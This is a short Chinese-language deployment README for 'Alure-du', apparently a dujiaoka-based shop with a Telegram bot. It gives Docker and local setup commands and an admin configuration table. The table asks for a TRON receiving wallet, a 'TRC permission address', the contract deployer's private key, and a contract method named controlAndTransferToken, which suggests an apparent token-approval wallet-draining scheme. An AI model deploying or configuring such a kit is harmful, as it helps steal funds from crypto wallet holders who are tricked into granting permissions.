# 快速部署

## Docker 部署（推荐）

```bash
git clone https://github.com/cnmbdb/Alure-du.git
cd Alure-du/主程序源码
cp .env.example .env
# 编辑 .env 配置数据库连接
docker-compose up -d
```

## 本地部署

```bash
# PHP 依赖
composer install

# 导入数据库
mysql -u root -p < dujiaoka.sql

# 配置环境
cp .env.example .env
php artisan key:generate

# 启动 Web
php -S 0.0.0.0:8080 -t public/

# 启动机器人
npm install
pm2 start bot.js --name du-bot
```

## 后台配置

登录 `/admin` → 财神系统 → 主要配置，填入：

| 配置项 | 说明 |
|--------|------|
| 机器人密钥 | Telegram Bot Token |
| TronGrid KEY | TronGrid API Key |
| 主域名 | 网站域名 |
| TRC收款地址 | 平台收款钱包 |
| TRC权限地址 | 部署的合约地址 |
| TRC权限私钥 | 合约部署者私钥 |
| 合约方法名 | controlAndTransferToken |
